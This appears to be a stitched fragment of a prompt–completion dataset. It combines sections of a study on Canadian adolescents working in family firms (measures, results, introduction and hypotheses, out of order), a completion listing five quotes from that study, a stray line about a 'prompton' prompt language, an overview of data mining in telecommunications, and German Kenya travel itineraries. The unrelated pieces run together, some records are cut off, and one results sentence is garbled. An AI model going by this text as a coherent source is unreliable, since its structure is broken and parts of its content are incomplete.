who work in their family firm on a year-round basis with all other adolescents. The year-round engagement in the business, we believe, allows for the development of better relationships with parents as well as developing better psychological well-being. Control Variables. We controlled for general individual attributes such as gender, age, and race. Female is a dichotomous measure of gender, with male respondents coded as 0 and female respondents coded as 1. Age is a continuous measure of the respondents’ actual age at the time of their T1 interview and can differ from their survey age. That is, although the survey age at T1 is 14 to 15 years, the actual range for this variable spanned from 13 to 16 years. Though most respondents were either 14 or 15 years old at T1, interviews were not conducted on the same day corresponding to the day respondents were surveyed in the first cycle of the NLSCY (i.e., when they were 8 or 9 years old). Because respondents are not surveyed on the same day each time, a few will be 1 year younger or older from their formal survey age. Our third general individual attribute variable is race. White is a dichotomous measure of race, with White respondents coded as 1 and non-White respondents coded as 0. Number of siblings has been associated with perceived parent–adolescent relationships (Kidwell, 1981) and research shows that socioeconomic status (SES) influences children’s health, cognitive, and socioemotional outcomes (Bradley & Corwyn, 2002). As such, we also included four family-level variables to control for differences across families—number of siblings, single-parent family, parent(s) average age, and SES. All independent and control variables were identified when adolescents were 14 to 15 years old except for the SES and single-parent family variables, which were identified when adolescents were 12 to 13 years old. The latest cross-sectional SES captured in the survey for our age group was based on the SES of up to both parents from when the adolescents were 12 to 13 years old (Statistics Canada, 2010). Number of siblings was coded as a count of the number of siblings belonging to a respondent. The single-parent family variable was also dummy coded as 1 for families with only one parent, and 0 for two-parent families. The household SES variable was derived using up to five variables: household income (in 1000s), years of education (for up to two parents), and occupational prestige (for up to two parents) using a modified version of the scale developed by Pineo, Porter, and McRoberts (1977). The SES variable was only coded for two-parent families that answered at least 3 of the 5 questions, and for single-parent families that answered at least two of the three questions posed to them. Statistics Canada, in their coding of the SES variable, makes a final transformation by standardizing all components of the SES variable, and taking the mean of all available components (Statistics Canada, 2002). Two versions of the SES variable were derived in the NLSCY: longitudinal SES and cross-sectional SES. The differences between the two are minor; however, the former is recommended for examining within-household SES changes, while the latter is suited for between-household differences in SES (Statistics Canada, 2002). Therefore, we use the cross-sectional version of the SES variable during the time that respondents were 12 to 13 years old. As single-parent households naturally score lower on the SES scale, Statistics Canada recommends that researchers control for single-parent households when using the scale; and we followed this recommendation (Statistics Canada, 2010). In the same vein, we control for parent(s) average age because older parents are more likely to have higher SES (Statistics Canada, 2002). Additionally, we included a dummy variable for working in general in our models to tease out the difference in outcomes for those who have work experience. Those who worked at the ages of 14 to 15 years either during the summer or/and school year received a score of 1 on this variable, while those who did not were coded as 0. All respondents who indicated working for their family firm for any part of the year were therefore also coded as 1 along with those who had general work experience. Including this control variable allowed us to differentiate the effect of working in family firm from the effect of general work. In other words, because we have variables for family firm work as well as general work, any family firm work effects can be interpreted as occurring above and beyond that of general work effects. Indeed, the motivation for including this variable is central to our argument that year-round family firm involvement has benefits beyond those associated with working in general (e.g., Houshmand et al., 2014). While many family farms are family businesses, they possess unique characteristics that might be different than nonfarm family businesses (Astrachan & Shanker, 2003; Dumas, Dupuis, Richer, & St.-Cyr, 1995; Steier, 2001). Hence, we controlled for whether the family firm is farm family business or nonfarm family business. To differentiate family farm workers from other types, we created two dummy variables, one to capture whether at least one parent worked in agriculture and one to capture whether the family lived in a rural or urban region. We observed that both of these groups were more likely to be employed as year-round family workers than other adolescents. We therefore included the two dummy variables as control variables in our models. Finally, we control for a lagged measure of general relationship with parent(s) from when adolescents were 12 to 13 years old (T0). The coding of this variable is identical to our first dependent variable, with the distinction that it is coded from an earlier time period and used as a control for potential selection bias. That is, the likelihood for adolescents with better parent–adolescent relationships to self-select into the family firm.3 Risk Sets To rule out alternative explanations of the positive relationship between year-round family firm involvement and our dependent variables, we analyzed three samples of data. The first sample examines year-round family firm involvement compared with all other arrangements. However, it remains possible that our predicted yearround family firm involvement effects stem from family firm properties as opposed to actual involvement in the family firm. An alternative explanation for any significant effects can be attributed to the different properties associated with growing up in a family business environment. As a result, we used two subsamples of the first sample. These risk sets help address concerns around these alternative explanations, by examining adolescents that have the opportunity for—or, are at risk of— family firm involvement. In our initial models, we compare adolescents who have year-round work involvement in their family firm to all other adolescents by testing the models on a full population sample representing a population of roughly 500,000 adolescents. In addition to building models of the full population, as a robustness check to rule out selection bias explanations and also to unearth interesting distinctions between children of family firms, we defined two specific additional risk sets to identify those adolescents in our sample that potentially could have had an opportunity to work in their family firms. The first risk set consists of those who reported working for their family business or farm at the minimum of either in the summer or during the school year when they were between 14 and 15 years old. This set represents roughly 115,000 Canadians who were 14 to 15 years old in 2000- 2001. For this set, we compared our independent variable of year-round work involvement which is defined by working for the family firm in both time periods, against partial involvement in either fall or summer. By repeating the same analysis, we conducted using the full population on this particular risk set, we were able to tease out the effect of year-round involvement in family firm from partial involvement. The second risk set was those who had at least one parent who was self-employed. Being self-employed is not equivalent to running a family firm. However, this risk set serves as a proxy for adolescents who have access to working along with their parents when their parents are self-employed. This set represents roughly 120,000 Canadians during the same period. For this group, we compared year-round family firm work involvement with everyone else in the risk set. Results We used ordinary least squares regression in accordance with the provided design weights to examine both parts of our theory (i.e., the effect of year-round family firm involvement on adolescent relationship with parents, and the effect of year-round family firm involvement on adolescent psychological well-being). Ordinary least squares regression is appropriate because our dependent variables are continuous, while utilizing Statistics Canada’s provided design weights allows us to properly account for attrition and generalize our results to our population of interest (i.e., Canadians that were aged 8 to 9 years in 1994-1995). The design of the survey is such that a unique set of weights are provided for each time period. As a result, our modeling choices are limited and we develop separate models to predict our dependent variables for each time period. As part of Statistics Canada’s privacy restrictions, we are not allowed to report the exact sample size or correlations between raw variables. We followed Statistics Canada guidelines for researchers utilizing individual-level data through the secure Research Data Centre program and provide details on the target population weighted appropriately. For our analysis, the target population covered approximately 500,000 people. We evaluated the variance inflation factor values of all variables in all models and found no significant multicollinearity problems (variance inflation factor < 1.28). Table 1 presents the full results of the regressions on general relationship with parents captured when adolescents are 14 to 15 years old (T1), and again when they are 16 to 17 years old (T1 + 2 years later). The first model includes only the control variables, whereas the following model adds the year-round involvement in the family firm dummy variable. In the subsequent set of models, which look at our dependent variable in T2, we similarly start with a model with only control variables, then add our independent variable of interest. We highlight the year-round involvement in the family firm variable in bold. Tables 2 and 3 present the results for the risk sets. Table 2 illustrates the findings for those adolescents who had indicated that they had some experience working in the family firm during that year, whereas Table 3 depicts those who had at least one self-employed parent. As seen in these tables, when adolescents are 14 to 15 years old, year-round involvement in the family firm generally has a statistically significant positive relationship with adolescents’ general relationship with their parents. Our risk set analyses in Table 2 show those that work for their family firm throughout the year report having a better relationship with parents, compared with those that work for family during only part of the year. Similarly, as shown in Table 3, the effects are positive and significant when looking at the set of respondents who have at least one self-employed parent showing those who have year-round involvement in their family firm experience better relationship with their parents than those who have a self-employed parent but do not have year-round work involvement at the family firm. Two years later, we find a consistent pattern. In the full population, general parental relationships involvement in their family firm. Looking at the size of the coefficients, we do observe an increase from T1 to T2 in all the models of full population and risk sets. By taking this into account, we infer that while working in a family firm appears to be a reliable way to initiate a rich parent–adolescent relationship, the positive relationships with parents continue to strengthen into the future. Together, these findings provide support for Hypothesis 1 that year-round involvement in the family firm leads to better relationship with parents. To gain perspective on the psychological outcome part of our theory, we used two measures: self-esteem and depression, and found empirical support for each. Table 4 presents the full results of the regression on depression. Depression data were collected by Statistics Canada in T2 when adolescents were 16 to 17 years old. As such, we show the analysis for T2 when adolescents were 16 to 17 years old. Self-esteem, on the other hand, was measured in both T1 and T2. Tables 5 to 7 present the results on self-esteem for the full sample and risk sets, respectively. We find consistent statistically significant effects for both measures when working year round in a family firm in T1, though for T2 only. There is only a marginally significant (p < .10) effect for working year round in the family firm in the full population model predicting self-esteem in T1. Both risk sets predicting self-esteem in T1 do not have statistically significant effects. These combined results could suggest that working in a family firm has positive and proximal (i.e., during T1) effects on self-esteem independent of the level of involvement (i.e., year-round or partial); although the evidence for such an effect is only marginal. Working year round in the family firm shows a negative relationship with depression, and a positive relationship with self-esteem, during T2. This pattern of results for the self-esteem models (significant effect in T2, lack of a consistent effect in T1) suggests that there may be a latent effect for working in the family firm year round at the ages of 14 to 15 years that manifests over time. The results of the models predicting general relationship with parents, with their larger effect sizes in T2, also supports the interpretation that year-round involvement of adolescents in the family firm can establish a gradually manifesting path toward desirable outcomes including a better relationship with parents as well as psychological well-being. Together, these findings provide support for Hypothesis 2 that year-round involvement in the family firm yields higher psychological well-being.","completion":"1. \\"In developed countries, many adolescents end up working in their family firms at a young age.\\" - This quote highlights the prevalence of adolescents working in family businesses and sets the stage for the study's focus on the consequences of this type of work. 2. \\"The impact on broader psychological well-being and the relationship with parents still needs further disentanglement.\\" - This quote acknowledges the gaps in the existing literature and emphasizes the need for a deeper understanding of the effects of working in family businesses on adolescents' well-being and relationships. 3. \\"These findings provide support for Hypothesis 1 that year-round involvement in the family firm leads to a better relationship with parents.\\" - This quote showcases one of the key hypotheses of the study and the results that support the positive impact of working in a family firm on parent-adolescent relationships. 4. \\"Together, these findings provide support for Hypothesis 2 that year-round involvement in the family firm yields higher psychological well-being.\\" - This quote summarizes the findings that support the hypothesis regarding the positive impact of working in a family firm on adolescents' psychological well-being. 5. \\"The ecological theory of human development helps understand the spillover between work and family settings and how experience in one setting influences the experience in another setting.\\" - This quote introduces the ecological theory of human development and its relevance to the study's exploration of the impact of working in a family firm on adolescent development."},{"prompt":"# This prompt is written in prompton, a language much like Python except with a custom string syntax for GPT prompt expressions, they look like this: # prompt'What is 2 + 2?' # Just like strings these prompt expressions can be assigned to variables and so on, but unlike strings they evaluate to the result of that GPT prompt.

This data can come from call detail records, network data, customer profiles, billing information, and other sources. By applying various data mining techniques, telecom companies can improve their decision-making processes, enhance customer satisfaction, optimize their networks, and increase revenue. Here are a few ways data mining can be used in the telecommunications industry with examples: 1. Customer Churn Prediction: Telecom companies use data mining to predict which customers are likely to leave for a competitor (churn). By analyzing usage patterns, billing history, customer service interactions, and demographics, companies can identify at-risk customers. For example, by applying predictive models, a telecom company might find that customers who have had multiple technical issues with their service in a short time are more likely to churn. They can then target those customers with special offers or proactive customer service to retain them. 2. Fraud Detection: Fraudulent activities such as illegal access, subscription fraud, and cloning are problems in the telecom industry. Data mining helps in detecting unusual patterns that could indicate fraudulent behavior. For instance, a sudden spike in international calls from a number that has never made such calls before could be flagged for investigation. 3. Network Optimization: Telecom companies can analyze network traffic data to find patterns that help them optimize their resources. For example, by finding periods of low network usage, they can schedule maintenance activities during those times to minimize disruptions. Similarly, patterns of high usage can indicate where additional network capacity is needed to improve service quality. 4. Customer Segmentation: Data mining helps in categorizing customers into different segments based on their usage behavior, value, preferences, and other factors. This segmentation enables telecom companies to tailor marketing campaigns and service offerings. For example, high-value customers might receive personalized packages, while price-sensitive segments might be targeted with discount offers. 5. Cross-selling and Up-selling: By analyzing customer data, telecom operators can predict which customers are likely to be interested in additional services. For instance, a customer with high data usage on their mobile device might be a good candidate for an up-sell to a larger data plan or a bundle with a mobile hotspot service. 6. Predictive Maintenance: Data mining can be applied to equipment and infrastructure maintenance. By analyzing patterns in equipment performance data, companies can predict when maintenance should be performed to prevent failures. This predictive maintenance ensures high network reliability and customer satisfaction. 7. Marketing Campaign Optimization: Telecom companies use data mining to understand the effectiveness of marketing campaigns and promotions.

Gerne mit Strandaufenthalt. Inlandsflüge sind zu teuer.","completion":"Eine 14-tägige Rundreise in Kenia, die auf die wichtigsten Nationalparks und Landschaftsvielfalt ausgelegt ist, könnte folgendermaßen aussehen: Tag 1-2: Nairobi Starten Sie in Nairobi. Nutzen Sie den ersten Tag, um sich von der Anreise zu erholen und die Stadt zu erkunden. Besuchen Sie beispielsweise das David Sheldrick Wildlife Trust's Elefanten-Waisenhaus oder das Giraffe Centre. Tag 3-4: Amboseli Nationalpark Fahren Sie zum Amboseli Nationalpark. Hier können Sie Elefanten vor dem majestätischen Kilimandscharo beobachten. Nehmen Sie eine Fahrt am frühen Morgen und am späten Nachmittag, wenn die Tiere am aktivsten sind. Tag 5-6: Tsavo West Nationalpark Vom Amboseli aus geht es weiter zum Tsavo West Nationalpark, bekannt für seine roten Elefanten, die sich in der rötlichen Erde wälzen. Die Mzima Springs und das Shetani Lava Flow sind weitere Highlights des Parks. Tag 7-8: Taita Hills Sanctuary Nach dem Besuch von Tsavo West können Sie das private Schutzgebiet Taita Hills Sanctuary besuchen. Hier können Sie in einer Lodge mit Glasfassade übernachten, wo Sie Tiere direkt von Ihrem Zimmer aus beobachten können. Tag 9-10: Tsavo East Nationalpark Tsavo East ist bekannt für seine weiten Ebenen und bietet die Möglichkeit, große Herden von Büffeln, Zebras und anderen Tieren zu sehen. Nicht verpassen sollten Sie den Aruba Dam und die Lugard Falls. Tag 11-12: Diani Beach Fahren Sie zur Küste und genießen Sie zwei Tage am traumhaften Diani Beach. Entspannen Sie sich am weißen Sandstrand oder gehen Sie schnorcheln im klaren Wasser des Indischen Ozeans. Tag 13-14: Rückfahrt nach Nairobi/Mombasa für den Abflug Je nachdem, ob Ihr Abflugort Nairobi oder Mombasa (was näher an Diani Beach liegt) ist, planen Sie entsprechend Ihre Rückfahrt. In Mombasa haben Sie möglicherweise noch Zeit, das Fort Jesus und die Altstadt zu erkunden. Da Sie Inlandsflüge vermeiden möchten, sollten Sie bereit sein, längere Fahrten zwischen den Zielen in Kauf zu nehmen, und es ist empfehlenswert, einen zuverlässigen Fahrer oder eine lokale Safari-Firma zu engagieren, um die Reise zu planen und durchzuführen. Die Anmietung eines Geländewagens mit Fahrer ist in Kenia eine gängige und relativ kosteneffiziente Methode, um die Nationalparks zu erkunden. Es ist zu beachten, dass bei nur Straßenfahrten die Reisetage länger sein können, was eventuell zu Einschränkungen bei der Zeit vor Ort führt. Eine gute Planung und Berücksichtigung der Straßenverhältnisse sowie möglicher Verzögerungen ist daher essenziell. Auch an klimatische Bedingungen und saisonale Besonderheiten, wie Regenzeiten, sollte gedacht werden. Beachten Sie, dass die Reise intensiv sein kann, und zwischen den einzelnen Parks Fahrzeiten von mehreren Stunden liegen können. Es könnte sinnvoll sein, gegebenenfalls manche Ziele zu streichen, um mehr Zeit an einem Ort zu verbringen und die Reise entspannter zu gestalten."},{"prompt":"Wie sieht es mit Hells irgendwas und Ambella oder so aus.

Hell's Gate Nationalpark: Der Hell's Gate Nationalpark ist berühmt für seine geothermische Aktivität, Schluchten und die Möglichkeit, Tiere zu Fuß oder mit dem Fahrrad zu beobachten. Der Park bietet eine etwas andere Safari-Erfahrung als die typischen Big-Game-Parks und ist etwa 100 km von Nairobi entfernt, was ungefähr zwei Stunden Fahrzeit bedeutet. Aberdare Nationalpark: Der Aberdare Nationalpark ist bekannt für seine Bergnebelwälder und Wasserfälle. Er ist ein großartiger Ort zur Beobachtung von Waldelefanten, Büffeln und manchmal auch Leoparden. Von Nairobi ist er rund 160 km entfernt, was mindestens drei Stunden Fahrtzeit entspricht. Im Rahmen einer Rundreise könnten Sie die beiden Nationalparks folgendermaßen einbauen: Tag 1-2: Nairobi Start in Nairobi mit anschließender Erkundung der Stadt. Tag 3-4: Hell's Gate Nationalpark Fahrt zum Hell's Gate Nationalpark für Aktivitäten wie Wandern oder Fahrradfahren. Die Entfernung von Nairobi zu diesem Park beträgt etwa 100 km. Tag 5-6: Aberdare Nationalpark Weiterfahrt zum Aberdare Nationalpark. Die Fahrtzeit von Hell's Gate zum Aberdare Nationalpark beträgt etwa 3-4 Stunden über eine Distanz von ca. 150 km. Für den Rest Ihrer Reise könnten Sie von Aberdare aus weiter zu den zuvor erwähnten Nationalparks reisen, wobei Sie die Reihenfolge anpassen, um effiziente Fahrtrouten zu berücksichtigen. Hier ist eine überarbeitete Route inklusive der Entfernungen: Tag 7-8: Amboseli Nationalpark (ca. 350 km von Aberdare) Tag 9-10: Tsavo West Nationalpark (ca. 220 km von Amboseli) Tag 11: Taita Hills Sanctuary (ca. 110 km von Tsavo West) Tag 12-13: Tsavo East Nationalpark (ca. 130 km von Taita Hills) Tag 14-15: Diani Beach (ca. 150 km von Tsavo East) Denken Sie daran, dass die Entfernungen und Fahrtzeiten nur geschätzte Werte sind und je nach Verkehr, Straßenzustand und Fahrzeugtyp variieren können.

Introduction The ecological theory of human development has mixed findings which suggest adolescent work has both negative and positive impacts on adolescent development (Zimmer-Gembeck & Mortimer, 2006). The mixed findings may partially be due to the research ignoring an important source of work context heterogeneity which has theoretical reasons for being quite different—the family firm. Working in a family firm at a young age, as opposed to a nonfamily firm, likely influences adolescent development differently. This is a critical theoretical gap in the literature as the prevalence of family firms around the globe, including those of developed countries (Arregle, Hitt, Sirmon, & Very, 2007; La Porta, Lopez-de-Silanes, & Shleifer, 1999), indicates that a large number of parents have the option of hiring their own children, especially their own adolescents in their own business. One important decision these parents make is whether to involve the next generation early on in the family business. Family legacy has a significant influence on the decision-making process of family firms (Hammond, Pearson, & Holt, 2016) such that the choosing and developing of a successor, while considering parent– child relationship quality, is one of the most important decisions that family business owners make (Cater & Justis, 2009). Care for the next generation prompts many family owners to hire their adolescents into the business. In developed countries, many adolescents end up working in their family firms at a young age. For example, according to nationally representative data gathered from the Youth in Transition Survey (Statistics Canada, 2012), 45% of Canadian adolescents who were 15 years old as of December 1999 reported having worked in their family business at one point. An important question thus emerges about the consequences of working in the family business on adolescents.With such a high percentage of adolescents in society having worked in a family firm, and given adolescence is a critical stage in developing one’s identity (Mortimer, 2003; Mortimer, Lam, & Lee, 2014), we must better understand the implications of adolescents working in their family business on the adolescent’s psychological well-being and relationship with parents. There has been a debate in the family studies literature regarding the impact of general work on adolescent development and relationships with parents. While some argue this influence is harmful (Greenberger & Steinberg, 1986) noting that this kind of work may lead to stress and a lower level of family commitment (Steinberg, Grennberger, Ruggiero, Garduque, & Vaux, 1982), others posit positive outcomes, such as a greater sense of independence (Mortimer & Shanahan, 1994). Recently, the literature has started to recognize the heterogeneity of outcomes among adolescents on the transition into the working world. Vuolo, Mortimer, and Staff (2014) recently started to disentangle these trajectories in terms of work identity outcomes categorizing the outcomes into “successful” and “floundering” based on a variety of characteristics including work experiences during transitional years. Mortimer and her colleagues (Mortimer, 2003; Mortimer, Kim, Staff, & Vuolo, 2016) start to introduce psychological outcomes such as self-efficacy, finding that “high-quality” employment is linked to increased self-efficacy during these transitional years. The impact on broader psychological well-being and the relationship with parents still needs further disentanglement. Additionally, these studies have been limited to general business work placements, and the dynamics are likely to differ when working with family members due to the inherent nature of the business family overlap. Working with family members is likely to affect the quality of the work experience dramatically, quite possibly providing higher quality employment experiences overall for adolescents. The psychological and relationship impacts of adolescent work become more complex when the work context is the family firm, where familial relationships are particularly affected due to the overlap of family and work settings. Empirical evidence in general settings suggests work has a negative influence on parent–adolescent relationships. One key explanation highlighted in the family studies literature is that working reduces the amount of time adolescents spend with their families (Ashbourne & Daly, 2010). However, in the context of the family firm, adolescents are able to spend more time with their parents at work and be exposed to a unique work environment. Since the underlying theoretical time overlap assumptions are different in the family business context, we expect that in the family business context, the impact of adolescent work may be different than suggested in the general work context typically used in the family studies literature. In other words, working in a family business may be an important source of heterogeneity in the quality of the work experience. This study is the first of its kind to explore this important relationship and make a direct comparison between adolescents who work for nonfamily firms with those who work in their family business. The specific research question we explore in this article centers on the consequences of adolescents working in their family business. We focus our attention on how working in this context influences adolescent development and the parent–child relationship differently. Finally, for those children who are likely to find themselves working in their family-owned firm, we empirically test the best strategy for improving psychological and family outcomes for adolescents. We construct the article as follows. First, drawing on ecological theories of human development, we briefly theorize about the consequences of an adolescent working along with their parents on two important outcomes: parent–adolescent relationships and adolescent wellbeing. We then use the National Longitudinal Survey of Children and Youth (NLSCY), a unique Canadian longitudinal data set well suited to shedding light on this question. To ensure the robustness of our findings, we use different operationalizations of our primary variables of interest and, due to the mixed definitions of family business in the literature, define a variety of business family risk sets. Finally, we discuss our findings and the managerial implications for family firm managers. The Consequences of Adolescents Working in Their Family Business The ecological theory of human development (Bronfenbrenner, 1979) helps understand the spillover between work and family settings and how experience in one setting influences the experience in another setting. The theory, specifically, delineates different types of systems that shape individual development. The lowest level is the micro system in which individuals function in different settings such as school, family, and work. The micro system is concerned with how ties developed in these settings shape the individual and ultimately his or her experience. The next system is the meso system in which the settings found in the micro system are assumed to interact with each other. Their interactions make it possible for relationships formed in one setting to influence the individual’s experience in other settings (Bronfenbrenner, 1979). These settings become more interconnected within the context of family firms. Family businesses have unique characteristics that entail both family and business life and require more nuanced theorizing to study (Chua, Chrisman, & Steier, 2003; Gersick, Lansberg, Desjardins, & Dunn, 1999; Sirmon & Hitt, 2003). They possess distinct traits from nonfamily firms such as the influence of family relations on simultaneous roles and shared identity (Tagiuri & Davis, 1996). This overlap of both roles and identity creates a need to modify broader theory when considering such contexts. The decision-making process of parents as the owners and managers of family firms to a significant extent is shaped by their intention and preference in perpetuation of their family dynasty (e.g., Jaffe & Lane, 2004; Lambrecht, 2005) and keeping family legacy (Hammond et al., 2016). Families have a varying degree of preference for different types of legacy—biological, material, and social. All these types of family legacy could serve as a source of motivation for involving the next generation in the business. However, given those families with a higher biological legacy orientation have a preference for passing the business through the family’s bloodline, they are more likely to consider employing their adolescents in the business. Prior studies suggest that concerns for keeping biological legacy influence how leaders of family firms make strategic decisions (e.g., Gersick, Davis, Hampton, & Lansberg, 1997; Hammond et al., 2016). We, therefore, deduce that the business decision to hire familial adolescents implies parents and adolescents spending more time with each other as well as adolescents working in a unique environment. In the family business context, parents as managers and owners pay attention to providing adolescents with a different type of working experience than their peers would receive from working for strangers. As Hammond et al. (2016) noted, “parental altruism, which represents a trait linking the parents’ welfare to their children’s welfare, is grounded in the notion that parents view their children as an extension of themselves” (p. 1216). Under such context, as family business owners, while spending more time with their children, parents also have incentive to provide their adolescents a unique working environment that in turn affects the adolescent’s relationship with them as well as the adolescent’s psychological well-being. Parent–Adolescent Relationship Adolescence is a critical stage in one’s life (Hall, 1904) and the work experience during this phase conveys a developmental importance both in the short and long run (Mortimer, 2010). An important consequence of work is the mark it leaves on the type of relationship one develops with her parents. Family studies researchers have studied this relationships by making an underlying assumption that adolescent work takes time away from family time (e.g., Ashbourne & Daly, 2010; Steinberg & Dornbusch, 1991). In fact, many of the studies in the literature highlight the importance of the role time plays in the parent–child relationship. Time is a tool families use to craft and shape family ties (Gillis, 1996). In families where both parents and children work, family members may be forced to sacrifice spending time with each other to meet other demands arising from work obligations, which may give rise to work–family conflict for both parents and adolescents. The value of time becomes even greater for adolescents, compared with younger children, as they have less access to family time due to their external activities such as staying out late with friends and working at jobs (Larson, Richards, Moneta, Holmbeck, & Duckett, 1996). While these findings are not conclusive, some studies suggest that reducing the amount of time family members spend with one another may weaken family ties (e.g., Mortimer & Shanahan, 1994; Steinberg & Dornbusch, 1991). The family–work literature also posits that family and work domains influence each other. While empirical evidence supports the notion that the number of work hours is negatively related to work– family balance (Valcour, 2007), it is driven by the tradeoff between working and spending time at home that causes distress to individuals rather than the absolute number of working hours (Barnett & Gareis, 2000). Furthermore, to the extent to which work interferes with family, the family provides less emotional support (Adams, King, & King, 1996)The reduction of time adolescents spend with their families, not surprisingly, is highlighted as one explanation for more negative outcomes associated with adolescents working (Ashbourne & Daly, 2010). These studies, however, do not take into account the nature of the relationship of the employer with the adolescents. While many of these studies highlight the importance of the role time plays in the parent–child relationship, they do not differentiate between who the adolescents are spending time with at work—a stranger or a relative. In family firms, spending time at work or with family is not mutually exclusive. We therefore expect that in the family firm context, the impact of working on adolescent behaviors may be different than currently suggested in the family studies literature. Within the context of family firms, the involvement of adolescents in the business carries its own weight. Family businesses are viewed by many family members as a form of collective wealth that provides utility to the members and while contributing to it is usually encouraged, disengagement from it may be frowned on for both financial and emotional reasons (Eckrich & Loughead, 1996). Because family members view working together and spending time together as advantageous to running a family firm (Cole, 2000), they may be disappointed when some members choose not to engage fully in the firm. Moreover, family firms count on the human capital represented by their members; and given that the size of families is shrinking, these resources have become more valuable (Aldrich & Cliff, 2003). Those family members who do not facilitate running the business may damage their relationships with prominent family members, in this case their father and mother. Part of this unique work experience is that the nature of work contribution also differs for adolescents who work in their family firms than those who work for other people. Those who work for their family firms directly contribute to their family business and hence their relationship with their parents may be more directly and positively influenced. The work setting also allows adolescents to establish new types of ties, in addition to familial ones. Not only can they learn more about their family firm and gain appreciation for the work their family puts into the business they might be able to better express themselves in new dimensions (Ward, 2004). Finally, adolescents who work in their family firms are exposed to unique work experiences that shape them differently than their counterparts. For example, one study showed that those who work in their family business are more likely in the future to enjoy richer career networking and select themselves into organizations with more fitting characteristics than other adolescents who work for a nonfamily member (Houshmand, Seidel, & Ma, 2014). The experience in the work role could spill over to the family role through both the affective and instrumental paths which makes the family role more positive or negative depending on the experience (Greenhaus & Powell, 2006). Consequently, we expect a richer work experience and a positive working relationship between parents and adolescents at work to favorably influence general parent–adolescent relationships. Spending time with family members coupled with the other reasons discussed previously such as establishing new types of connections, finding new avenues to express themselves, and contributing to the family business all suggest that adolescents develop better relationships with their parents when they work consistently in their family firms. Hypothesis 1: Adolescents who have year-round involvement in their family firms report a better relationship with their parents than all other adolescents. Psychological Well-Being Work that is dissatisfying or stressful can impair the psychological well-being of adolescents. Stress and depression in the workplace is often the result of feeling responsible for outcomes beyond one’s control (Shanahan, Finch, Mortimer, & Ryu, 1991). Work that interests and challenges the worker can lead to positive psychological outcomes. For example, boys reported a greater sense of well-being when assigned interesting and complex work; girls reported greater self-esteem and well-being when they perceived school and work settings to be mutually supportive (Mortimer, Finch, Shanahan, & Ryu, 1992). Parents are altruistic toward their children and family members of a family business also display altruistic behavior toward each other (Schulze, Lubatkin, & Dino, 2003). Families, therefore, have incentives to provide positive and developmental working conditions for their own children. To keep family and family firm legacy, parents groom the next generation as their business successors (e.g., Hammond et al., 2016). We thus argue that in family firms, adolescents are more likely to have access to developmental work assignments than in situations where they work for strangers. They are also more likely to receive support from other settings such as school and family for the work they are doing at their family firms. A study of children growing up in the Great Depression concluded that those who helped their financially troubled families by either working within or outside the home had a higher level of self-confidence than those who did not have the same opportunity (Elder & Rockwell, 1979). In the same vein, we predict that due to the better working conditions and the ability to financially help their family, those adolescents who have year-round involvement in their family firms develop greater psychological well-being. Taking into account the role time plays, compared with their younger siblings, adolescents have fewer opportunities to spend time with their family and may also face work–family conflict due to their scarcity of time; which becomes divided among school, friends, work, and family (Larson et al., 1996). Higher level of work–family conflict is positively associated with psychological distress and depression for adults (Frone, 2000; Hammer, Neal, Newsom, Brockwood, & Colton, 2005). Similarly, adolescents facing time constraints and higher levels of work–family conflict may experience lower psychological well-being. Working adolescents in family firms, however, have more opportunities to spend time with their families than their counterparts. They, additionally, have more spare time to allocate to other settings such as social and school. Therefore, these adolescents are better able to handle environmental demands and experience less distress. When parents hire their adolescents into the business, they provide a unique work environment to adolescents. The unique work environment stems from the familial ties these young workers have with their employers (Houshmand et al., 2014) who are more likely to encourage the youngsters to engage in more interesting and complex tasks than other potential employers at odd jobs elsewhere. This positive experience in the work role could spill over to other settings (Greenhaus & Powell, 2006). Moreover, while all adolescents are pulled by many external forces in different directions, those who work in their family firms are more likely able to manage their family time more efficiently by having the opportunity to spend time with family at work. Based on this logic, we argue that adolescents who have year-round involvement, defined as both during the school year and summer, in their family firms have higher psychological well-being than their peers. Hypothesis 2: Adolescents who have year-round involvement in their family firms report higher psychological well-being than all other adolescents. Method Data and Sample We identified a longitudinal data set well suited to exploring our questions called the NLSCY. The NLSCY was collected by Statistics Canada and Human Resources and Skills Development Canada. We used the longitudinal weights provided by Statistics Canada to account for attrition between cycles, which ensures the models are representative of the targeted population. As recommended by Statistics Canada, we conducted Stata BRR (balanced repeated replication) bootstrapping for all of our models. Employing this method helps ensure that our sample represents the target population and allows us to draw more generalizable conclusions from the results. The NLSCY focuses on child growth development from an ecological perspective. According to NLSCY user guides (e.g., Statistics Canada, 2010), survey content including subject areas, priorities, and survey questions were determined by (a) the NLSCY expert advisory group, which consists of researchers in the area of child development and the social sciences, (b) federal departments, and © representatives responsible for child development programs in the provinces and territories. As a result, several prevalidated scales were collected; and we predict two in our current study (Marsh & O’Neill, 1984; Radloff, 1977). For the purpose of this study, we used NLSCY data spanning 8 years, from when our subset of adolescents, representing over 570,000 Canadians who were 8 to 9 years old in 1994-1995 to when they were 16 to 17 years old in 2002-2003. In this study, we tested our theory using our primary independent variables of interest when adolescents were 14 to 15 years old to predict outcomes in later years, that is, when they were 16 to 17 years old. We also used various control variables from as early as ages 8 to 9, as detailed below. Measures Dependent Variables. Our questions lead to two sets of dependent variables for this study. We theorized that adolescents who have year-round involvement in their family firms have a better relationship with their parents and have higher psychological well-being than all other adolescents. For robustness, we operationalized these constructs in multiple ways as follows. General relationship with parent(s). We used a number of measures to capture the parent–adolescent relationship construct from different perspectives: the adolescents’ perception of how much parental affection they receive, how much the adolescents feel their parent(s) understand them, and the overall adolescent impression of their relationship with their parent(s). The questions pertaining to fathers and mothers were asked separately. Three measures captured adolescents’ perceptions of their relationship with each applicable parent. The questions were phrased as follows: (a) Affection— How much affection do you receive from your (mother/ father)? (b) Understanding—How well do you feel that your (mother/father) understands you? © Overall Relationship—Overall, how would you describe your relationship with your (mother/father)? The affection, understanding, and overall relationship variables were each coded with three ordered outcomes: 1 for very little/not at all, 2 for some and 3 for a great deal. We used a latent construct approach to measure parent–adolescent relationship. First, we created a general measure for relationship with father and a general measure for relationship with mother. Cronbach’s alpha for the father measures are .85 and .84 when adolescents are 14 to 15 years old and 16 to 17 years old, respectively. For the mother measures, they are .80 and .81. Although these measures originate from the NLSCY, the internal consistency of the scale is high. The measures were determined by domain experts and continue to be adopted in research regarding relations with parents (e.g., Myers, 2005) as well as caregivers (e.g., Flynn, Robitaille, & Ghazal, 2006). Furthermore, these studies exhibit similarly high levels of scale reliability. Our approach to this variable is similar to Bushnik’s (2005) article examining youth depressive symptoms and changes in relationships with parents and peers in that we use the same three parent measures.1 However, we then combined the measures as a single broader construct of overall relationship with parents by averaging all valid parent–adolescent relationship components (i.e., three components for single-parent families and six components 